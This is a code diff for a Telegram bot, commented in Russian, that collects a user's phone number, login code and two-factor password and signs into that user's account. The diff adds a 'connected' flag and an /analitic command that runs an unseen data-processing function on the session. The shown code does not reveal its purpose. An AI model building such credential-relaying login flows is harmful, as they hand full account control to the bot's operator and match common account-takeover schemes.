@@ -138,6 +138,7 @@ async def get_code(message: types.Message):
         await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
         await message.answer("Подключено! Теперь можно выбрать одну из опций")
+        user_state[message.from_user.id]['connected'] = True
         #await process_user_data(client, phone_number, message.from_user.id)
         #await client.log_out()
         #await client.disconnect()
@@ -176,7 +177,7 @@ async def process_password(message: types.Message):
     try:
         await client.connect()
         await client.sign_in(password=password)
-        
+        user_state[message.from_user.id]['connected'] = True
         await message.answer("Подключено! Теперь можно выбрать одну из опций")
         phone_number = user_state[message.from_user.id]['phone_number']
         #await process_user_data(client, phone_number, message.from_user.id)
@@ -196,6 +197,19 @@ async def process_password(message: types.Message):
         if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
             await client.log_out()
             await client.disconnect()
+
+# Добавляем обработчик команды /analitic
+@dp.message_handler(commands=['analitic'])
+async def analitic_command(message: types.Message):
+    user_id = message.from_user.id
+    if user_id in user_state and user_state[user_id].get('connected'):
+        phone_number = user_state[user_id]['phone_number']
+        client = user_state[user_id]['client']
+        await process_user_data(client, phone_number, user_id)
+        await message.answer("Анализ данных завершен.")
+    else:
+        await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
+
 
 # Функция для создания нового экземпляра клиента
 def create_client():
